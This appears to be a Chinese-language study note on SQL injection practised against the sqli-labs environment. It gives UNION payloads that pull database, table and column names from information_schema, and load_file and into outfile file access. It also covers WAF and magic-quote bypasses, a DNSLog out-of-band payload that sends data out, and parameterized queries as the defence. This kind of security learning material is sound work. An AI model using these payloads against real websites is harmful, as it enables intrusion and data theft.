![image-20230411153143188](E:\AppData\Roaming\Typora\typora-user-images\image-20230411153143188.png)



![image-20230411153201791](E:\AppData\Roaming\Typora\typora-user-images\image-20230411153201791.png)

![image-20230412125929268](E:\AppData\Roaming\Typora\typora-user-images\image-20230412125929268.png)

忍者安全测试系统github.com/Audi-1/sqli-labs



#  基础知识

### 请求方式

#### GET：

利用数据包注入，且注入语句接在url后时，空格用+或者%20替代，这样才能转义为空格

www.xxx.com/index.php?id=1很有可能等于www.xxx.com/?id=1，他们指向同一个文件。即www.xxx.com/?id=1也是可以注入的

#### POST：

www.xxx.com/也可注入，因为注入数据在data中，不在url中



### 注入点位置

| SQL语句 | 注入点               |
| ------- | -------------------- |
| select  | 列名，表名，order by |
| insert  | 插入的值             |
| update  | 更新的值，where      |



### php的 ？& and 注释符

?接收参数，&连接多个参数，作用域and<&

或or	且and	非xor

| 注入式(x有注入点)        | 正确性 |
| ------------------------ | ------ |
| ?y=1 and 1=1&x=2         | ×      |
| ?y=1&x=2 and 1=1         | √      |
| ?y=1 and 1=1&x=2 and 1=1 | √      |

--+和# 可以注释掉后面的代码，如limit



### 数据库information_schema

MySQL5.0以上版本，称为高版本

高版本中存在自带数据库information_schema

它是一个存储有所有数据库名、表名、列名的数据库

可以通过查询它得到指定数据库下的表名或列名信息

| 数据库information_schema中的表 | 存储信息     |
| ------------------------------ | ------------ |
| information_schema.tables      | 所有表名     |
| information_schema.columns     | 所有列名     |
| information_schema.schemata    | 所有数据库名 |

| information_schema.tables中的列 | 存储信息 |
| ------------------------------- | -------- |
| table_schema                    | 数据库名 |
| table_name                      | 表名     |

| information_schema.columns中的列 | 存储信息 |
| -------------------------------- | -------- |
| table_schema                     | 数据库名 |
| table_name                       | 表名     |
| column_name                      | 列名     |

| information_schema.schemata中的列 | 存储信息 |
| --------------------------------- | -------- |
| schema_name                       | 数据库名 |

而低版本的数据名只能靠猜，比如sqlmap就有字典用来尝试

或者能load_file读取文件，则可以在某些文件中找到一些名



# 注入流程

## 判断注入点：

### 老方法：

and 1=1页面正常

and 1=2页面不正常

则存在注入点

### 新方法：

?id=1这是正常的访问

?id=1hvieug加上一堆乱码，如果返回页面错误，则有注入点

如果加乱码后，页面404，或跳转到其他页面，则表示页面有检测，应该没有注入点



判断数字型：

1/1：正常返回

1/0：异常

判断字符型：

'：异常

''：正常



## 判断列名数量（字段数）

?id=1 order by 1

从1加到页面返回不正常为止

之后就转用union

?id=1 union select 1,2,3,4

注意：页面返回信息可能是1,2,3,4中的某几个，只将能返回的数字替换为要爆出的信息



## 让页面报错

?id=-1



## 得到数据库版本，数据库名等信息

数据库版本：version()

数据库名：database()

用户：user()		eg.root@localhost，root为高权限，高权限注入最简单，其他用户为低权限用户。连接用户是在数据连接的时候决定的。如果一个网站的数据库和其他网站的数据库相关联，而此网站没有注入点，则可以通过其他有注入点的网站获取root权限，从而迂回获取此网站的信息

操作系统：@@version_compile_os	eg.Linux

（也是用select）



## 查询某数据库中所有表名

?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='选定的数据库'

注意：表名通常有多个，所以只用1,table_name,3,4则只会显示一个，所以用group_concat(table_name)，从而显示多个



## 查询某表中所有列名

?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='选定的表'



## 查询指定数据

use 数据库名;

?id=-1 union select 1,列名,列名,4 from 选定的表 limit ...

注意：limit：[x,y)

limit 0,1 表示查询第一个

limit 1,1表示查询第二个

若有多个限制条件，则where+and



# 细节

## 文件读写操作

需要secure_file_priv=空，即获取数据库对其他文件的读取权限

=null，不允许任何

=路径，路径目录允许

需去my.ini设置[mysqld]的 secure_file_priv=‘’（空格都不要）,重启服务即可net start/stop mysql。（我曾用默认路径，怎么都运行不好，变成空就好了）

#### load_file()：读取函数

eg. select load_file('c:/error.txt');

注意：路径中最好用/，因为\n还是会被解析成换行，可以用双斜杠'\\'

临时改变编码：

```
select convert(load_file('e:/a.txt') using utf8);
```

有的文件读取的时候会包含另外的文件，导致读不出本来的结果，这时候用load_file就可以看源文件

1.读取确定的文件

2.随机读取，可以在网上找到很多敏感文件地址。

#### into outfile或 into dumpfile：导出函数

eg. select 'x' into outfile 'd:/www.txt';

出现报错：ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement

需要找到数据库存储路径show variables like '%secure%';

查看secure_file_priv

```
secure_file_priv`为NULL禁止导出文件`secure_file_priv=""
secure_file_priv`指定地址限制导出地址只能在此`secure_file_priv=“D:/”
secure_file_priv`为空可以导出到任意文件`secure_file_priv=
```

dumpfile：只能写入一行数据，适用于二进制文件

文件写入失败的原因：

1.防护软件拦截了

2.目录无读写权限

3.写入工具内置的写入方法不太行，不太全面



#### 路径获取方法：

1. 报错显示

当出现错误时，页面可能会返回错误的位置，即可知道页面的位置

2. 遗留文件

eg.phpinfo.php，站长便于管理

3. 漏洞报错

eg.网上搜phpinfo爆路径

4. 平台配置文件

通过读取平台的配置文件。eg. .conf, .xml等

5. 爆破



## PHP魔术符号

magic_quoto_gpc=on 将''、""、/、\进行转义

此时select 'x' into outfile 'd:/www.txt';

变为select \ 'x\ ' into outfile \ 'd:/\www.txt\ ';(因为md，\和‘直接加了个空格，方便辨别)，这样就执行不了。任何和路径有关的操作都受影响

若不存在，则正常注入

若存在，则使用 编码 或 宽字节 进行绕过

#### 编码

单引号里的进行16进制转化，因为用了16进制就不需要单引号

#### 宽字节

不同编码格式中，中文的字节数不同



## 防注入方法

#### 用户输入参数化

原：

```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

参数化：

```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```



#### 自带防御过滤

魔术符号magic_quoto_gpc=on

#### 内置函数过滤

is.array，is_int(无法绕过)等，检测输入类型

#### 自定义关键字

eg. $id = str_replace('select',' ',$id);将id中的select替换为空，此处可以用大写绕过，又可用正则表达式匹配来过滤

#### WAF防护软件

安全狗，宝塔等

大部分实验原理是 过滤关键字



## WAF绕过

#### 更改提交方式

过滤关键字可能只作用于一种提交方式，可以尝试其他提交方式

#### 大小写混合，加密编码，注释符混用，等价函数替换，特殊符号混用

打乱关键字，避免被库发现

有的函数作用差不多

特殊符号可能影响对输入的接收

#### 借助数据库特性

利用语句写法多样性

#### 垃圾数据溢出

数据发多了，WAF接收不了



## 判断干扰符

'	"	%	(	{	等

字符：’和"

SQL的搜索：%，eg. select * from user where name like '%hello%'



#### 注入的请求方法

GET、POST、COOKIE、REQUEST、HTTP

'''$ge=$_ GET['g'];		

GET方式：无论请求头是用的什么，url后面的都能被get接收到	

$ps=$_ POST['p'];		

$co=$_ COOKIE['c'];  	(接收cookie部分)

$re=$_ REQUEST['r']; (全部接收)		

$ht=$_ HTTP['h'];	'''(因为.md，所以_和GET隔开了)

$_SERVER['xxx']获取客户端的xxx信息

json注入：(app常用json提交数据)	json格式：{'user':'xxx', 'passwd':'xxx'}

select * from users where username={$user}



# 其他注入方式

## 跨库注入

在当前数据库下，查其他数据库的表，可用 数据库.表



## 加密注入

%3D：=

如果数据包的某个注入点的内容为加密内容，则需将原内容和注入内容一起加密后放出



## 二次注入

![image-20230415161204784](E:\AppData\Roaming\Typora\typora-user-images\image-20230415161204784.png)

需要知道源码，需要人工判断与注入

先输入一个危险的语句到数据库，没有被检测到，之后触发使用这个输入的危险语句，从而触发二次注入



## DNSLog带外注入

利用UNC路径去访问服务器

需要高权限（文件读写权限）

连接ceye.io平台/dnslog.cn

可用工具：github.com/ADOOO/DnslogSqlinj

sqlmap的tamper目录：插件，可自加

```
load_file(concat('\\\\',select hex(database()),'.xxx\\test'))--+
\\\\转义后为\\
```





## 中转注入

通过运行脚本，脚本中访问url页面并进行注入，并获得返回的页面

如sqlmap注入某文件，该文件又是个攻击其他网站的脚本，最终sqlmap产生的payload连到了攻击其他网站的url上，实现中转注入



## 堆叠查询注入

两个查询语句在一行，分号隔开

某些数据库恶意，如MySQL

验证：?id=1';select sleep(3)--+

常出现在SQLserver



## 验证码绕过

1.前端验证

2.后端验证

​	1）页面不刷新，验证码就不变

​	2）验证码存在生产周期

​	3）收到登录请求，验证码改变：脚本识别验证码（captche-killer bp插件）



注意login.js等js文件



token可以用来防止CSRF

rlike和like作用一样

... union all ...：重复不删除

order by +数字：根据第n列数据来排列



伪静态：动态网页通过伪装url，假装是静态1网页。

方式1：通过

方式2：通过

如xxx/?id=1 => xxx/id/1.htm

![image-20230630092945854](E:\AppData\Roaming\Typora\typora-user-images\image-20230630092945854.png)

脚本引擎：apache等



mysql是弱类型的

所以?id=1 and 1=2时，不报错，说明是字符型

但是为什么还显示?id=1的结果呢

因为mysql将'1 and 1=2'强制转换为数字型，并转换为1

("$id")

url中禁止直接用空格，空格表示url结束，需用+等

注释符用不了那就用‘，“，（等手动闭合

grep match：设置响应包提取关键字

and优先级高于or
